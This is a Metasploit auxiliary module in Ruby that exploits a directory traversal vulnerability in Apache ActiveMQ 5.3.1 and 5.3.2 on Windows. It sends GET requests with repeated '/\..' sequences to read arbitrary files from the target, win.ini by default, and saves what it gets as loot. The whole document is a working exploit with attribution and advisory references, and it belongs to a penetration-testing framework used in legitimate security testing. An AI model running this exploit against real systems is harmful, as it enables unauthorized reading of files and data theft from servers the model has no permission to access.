##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache ActiveMQ Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability in Apache ActiveMQ
        5.3.1 and 5.3.2 on Windows systems. The vulnerability exists in the Jetty's
        ResourceHandler installed with the affected versions. This module has been tested
        successfully on ActiveMQ 5.3.1 and 5.3.2 over Windows 2003 SP2.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'AbdulAziz Hariri', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '86401' ],
          [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=895' ],
          [ 'URL', 'https://issues.apache.org/jira/browse/amq-2788' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(8161),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
        OptInt.new('DEPTH', [false, 'Traversal depth if absolute is set to false', 4])
      ])
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("#{rhost}:#{rport} - Please supply FILEPATH")
      return
    end

    travs = "/\\.." * (datastore['DEPTH'] || 1)
    travs << "/" unless datastore['FILEPATH'][0] == "\\" or datastore['FILEPATH'][0] == "/"
    travs << datastore['FILEPATH']

    print_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => travs,
      'method'       => 'GET',
    })

    if res and res.code == 200
      contents = res.body
      fname = File.basename(datastore['FILEPATH'])
      path = store_loot(
        'apache.activemq',
        'application/octet-stream',
        ip,
        contents,
        fname
      )
      print_status("#{rhost}:#{rport} - File saved in: #{path}")
    else
      print_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
